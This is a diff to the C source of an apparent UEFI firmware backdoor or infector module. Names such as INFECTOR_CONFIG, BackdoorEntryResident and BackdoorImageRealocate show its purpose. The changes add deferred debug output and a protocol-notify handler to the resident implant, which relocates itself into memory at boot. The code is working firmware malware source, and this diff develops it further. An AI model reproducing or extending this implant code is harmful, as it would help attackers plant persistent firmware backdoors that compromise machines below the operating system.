@@ -57,10 +57,12 @@ __declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig =
 PINFECTOR_STATUS m_InfectorStatus = (PINFECTOR_STATUS)(STATUS_ADDR);
 
 VOID *m_ImageBase = NULL;
+EFI_SYSTEM_TABLE *m_ST = NULL;
 EFI_BOOT_SERVICES *m_BS = NULL;
 
 // console I/O interface for debug messages
 EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *m_TextOutput = NULL; 
+char *m_PendingOutput = NULL;
 //--------------------------------------------------------------------------------------
 void ConsolePrint(char *Message)
 {
@@ -75,9 +77,57 @@ void ConsolePrint(char *Message)
             Char[0] = (CHAR16)Message[i];
             Char[1] = 0;
 
+            // print string to the screen
             m_TextOutput->OutputString(m_TextOutput, Char);
         }
     }   
+    else
+    {
+        if (m_PendingOutput && strlen(m_PendingOutput) + Len < PAGE_SIZE)
+        {            
+            // text output protocol is not initialized yet, save output to temp buffer
+            strcat(m_PendingOutput, Message);
+        }
+    }
+}
+//--------------------------------------------------------------------------------------
+VOID SimpleTextOutProtocolNotifyHandler(EFI_EVENT Event, VOID *Context)
+{
+    EFI_STATUS Status = EFI_SUCCESS;
+
+    if (m_TextOutput == NULL)
+    {
+        // initialize console I/O
+        Status = m_BS->HandleProtocol(
+            m_ST->ConsoleOutHandle,
+            &gEfiSimpleTextOutProtocolGuid, 
+            (VOID **)&m_TextOutput
+        );
+        if (Status == EFI_SUCCESS)
+        {
+            m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
+            m_TextOutput->ClearScreen(m_TextOutput);
+
+            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Text output protocol is ready\r\n");
+
+            // print pending messages
+            if (m_PendingOutput)
+            {
+                EFI_PHYSICAL_ADDRESS PagesAddr = (EFI_PHYSICAL_ADDRESS)m_PendingOutput;
+
+                ConsolePrint(m_PendingOutput);
+
+                // free temp buffer
+                m_BS->FreePages(PagesAddr, 1);
+                m_PendingOutput = NULL;
+
+#if defined(BACKDOOR_DEBUG)
+
+                m_BS->Stall(TO_MICROSECONDS(3));
+#endif
+            }            
+        }        
+    }        
 }
 //--------------------------------------------------------------------------------------
 VOID *ImageBaseByAddress(VOID *Addr)
@@ -141,11 +191,61 @@ VOID *BackdoorImageRealocate(VOID *Image)
 //--------------------------------------------------------------------------------------
 typedef VOID (* BACKDOOR_ENTRY_RESIDENT)(VOID *Image);
 
+EFI_STATUS RegisterProtocolNotifyDxe(
+    EFI_GUID *Guid, EFI_EVENT_NOTIFY Handler,
+    EFI_EVENT *Event, VOID **Registration)
+{
+    EFI_STATUS Status = m_BS->CreateEvent(EVT_NOTIFY_SIGNAL, TPL_CALLBACK, Handler, NULL, Event);
+    if (EFI_ERROR(Status)) 
+    {
+        DbgMsg(__FILE__, __LINE__, "CreateEvent() fails: 0x%X\r\n", Status);
+        return Status;
+    }
+
+    Status = m_BS->RegisterProtocolNotify(Guid, *Event, Registration);
+    if (EFI_ERROR(Status)) 
+    {
+        DbgMsg(__FILE__, __LINE__, "RegisterProtocolNotify() fails: 0x%X\r\n", Status);
+        return Status;
+    }
+
+    DbgMsg(__FILE__, __LINE__, "Protocol notify handler is at "FPTR"\r\n", Handler);
+
+    return Status;
+}
+
 VOID BackdoorEntryResident(VOID *Image)
-{    
+{        
+    VOID *Registration = NULL;
+    EFI_EVENT Event = NULL;  
+    EFI_STATUS Status = EFI_SUCCESS;
+    EFI_PHYSICAL_ADDRESS PagesAddr;
+
     m_ImageBase = Image;        
 
-    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");
+    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");    
+
+    // allocate memory for pending debug output
+    Status = m_BS->AllocatePages(
+        AllocateAnyPages,
+        EfiRuntimeServicesData,
+        1, &PagesAddr
+    );
+    if (Status == EFI_SUCCESS) 
+    {
+        m_PendingOutput = (char *)PagesAddr;        
+        m_BS->SetMem(m_PendingOutput, PAGE_SIZE, 0);
+    }
+    else
+    {     
+        DbgMsg(__FILE__, __LINE__, "AllocatePages() fails: 0x%X\r\n", Status);
+    }    
+
+    // set text output protocol register notify
+    RegisterProtocolNotifyDxe(
+        &gEfiSimpleTextOutProtocolGuid, SimpleTextOutProtocolNotifyHandler,
+        &Event, &Registration
+    );
 
     m_InfectorStatus->Success += 1;
 }
@@ -194,6 +294,7 @@ _ModuleEntryPoint(
     EFI_STATUS Status = EFI_SUCCESS;    
     VOID *Image = NULL;
 
+    m_ST = SystemTable;
     m_BS = SystemTable->BootServices;
 
 #if defined(BACKDOOR_DEBUG_SERIAL)
@@ -223,14 +324,14 @@ _ModuleEntryPoint(
     DbgMsg(__FILE__, __LINE__, "                              \r\n");
     DbgMsg(__FILE__, __LINE__, "******************************\r\n");
 
+#endif // BACKDOOR_DEBUG   
+
     if (m_ImageBase)
     {
         DbgMsg(
             __FILE__, __LINE__, "Image address is "FPTR"\r\n", 
             m_ImageBase
-        );
-
-#endif // BACKDOOR_DEBUG    
+        ); 
 
         // copy image to the new location
         if ((Image = BackdoorImageRealocate(m_ImageBase)) != NULL)
